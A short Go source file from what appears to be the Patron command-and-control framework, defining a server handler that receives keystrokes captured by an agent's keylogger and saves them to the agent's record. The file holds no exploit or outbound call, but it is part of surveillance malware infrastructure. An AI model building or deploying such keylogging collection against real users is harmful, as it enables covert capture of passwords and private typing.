package handlers

import (
	"net"

	"github.com/PatronC2/Patron/data"
	"github.com/PatronC2/Patron/types"
)

// Fetches the keylogs from an agent and returns the status to the client

type KeysHandler struct{}

func (h *KeysHandler) Handle(request types.Request, conn net.Conn) types.Response {
    c, ok := request.Payload.(types.KeysRequest)
    if !ok {
        return types.Response{
            Type:    types.KeysResponseType,
            Payload: types.KeysResponse{},
        }
    }
	data.UpdateAgentKeys(c.AgentID, c.Keys)
	// This type doesn't actually matter since the client won't read it
	return types.Response{
		Type:    types.KeysResponseType,
		Payload: types.KeysResponse{},
	}
}
